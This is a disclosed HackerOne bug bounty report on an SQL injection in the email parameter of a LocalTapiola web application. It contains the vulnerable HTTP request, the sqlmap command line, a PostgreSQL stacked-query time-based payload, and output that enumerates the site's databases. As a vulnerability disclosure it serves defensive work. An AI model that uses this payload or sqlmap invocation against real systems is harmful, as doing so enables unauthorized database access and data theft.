@@ -1,0 +1,71 @@
+ReportLink:https://hackerone.com/reports/179751
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/anandakshya
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:1560.0
+Severity:medium
+State:Closed
+DateOfDisclosure:07.01.2017 13:06:54
+
+Summary:
+##Issue
+
+The reporter found an SQL injection in one of the applications in viestinta.lahitapiola.fi. 
+
+##Fix
+
+The issue was investigated and found to be valid and critical. 
+
+##Reasoning
+
+The reported case was valid and right on target for the scope of the bug bounty program. SQL injections are always critical as they pose a serious threat to the underlying database and the information therein. Even in the case of the data being public information - as was the case here -  there are still many vectors for seriously misusing this kind of a vulnerability. 
+I would like to report a SQL Injection vulnerability on **viestinta.lahitapiola.fi**
+
+_*Vulnerable Request:*_
+
+```
+GET /webApp/omatalousuk?email=aaaaa HTTP/1.1
+Host: viestinta.lahitapiola.fi
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet
+Origin: http://www.lahitapiola.fi
+DNT: 1
+Connection: close
+```
+
+_*Vulnerable Parameter:*_  *email*
+
+The vulnerability was discovered by [sqlmap framework](https://github.com/sqlmapproject/sqlmap).
+
+sqlmap output below:
+
+```
+akshya @ localhost in ~/sqlmap $ python sqlmap.py -r viestinta -p email -v3 --dbs
+
+[01:08:22] [INFO] parsing HTTP request from 'viestinta'
+[01:08:22] [DEBUG] resolving hostname 'viestinta.lahitapiola.fi'
+[01:08:22] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: email=aaaaa';SELECT PG_SLEEP(5)--
+    Vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)--
+---
+[01:08:23] [INFO] the back-end DBMS is PostgreSQL
+web application technology: Apache
+back-end DBMS: PostgreSQL
+available databases [4]:
+[*] information_schema
+[*] pg_catalog
+[*] public
+[*] tapiola
+```
+Please, let me know once this patched is deployed on production.
+
+Regards
+Akshya
